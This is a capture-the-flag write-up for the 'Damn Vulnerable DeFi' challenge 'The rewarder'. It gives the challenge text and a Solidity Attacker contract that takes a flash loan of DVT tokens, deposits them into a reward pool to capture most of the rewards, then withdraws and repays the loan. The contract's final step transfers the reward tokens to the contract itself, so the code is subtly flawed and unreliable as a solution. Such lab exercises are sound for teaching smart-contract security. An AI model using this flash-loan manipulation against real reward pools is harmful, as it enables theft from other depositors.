# Challenge #5 - The rewarder

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

# Solution

```
contract Attacker {
    FlashLoanerPool public flashLoanerPool;
    DamnValuableToken public damnToken;
    TheRewarderPool public rewarderPool;
    RewardToken public rewarderToken;

    constructor(
        address _flashLoaner,
        address _damnValuableToken,
        address _rewarderPool,
        address _rewardToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoaner);
        damnToken = DamnValuableToken(_damnValuableToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewarderToken = RewardToken(_rewardToken);
    }

    function getTokens(uint256 amount) public {
        //get free tokens
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        //transfer token to rewardpool
        damnToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);
        //transfer tokens back to lending pool
        damnToken.transfer(msg.sender, amount);
        // get rewarder tokens
        rewarderToken.transfer(
            address(this),
            rewarderToken.balanceOf(address(this))
        );
    }

    fallback() external payable {}

    receive() external payable {}
}

```
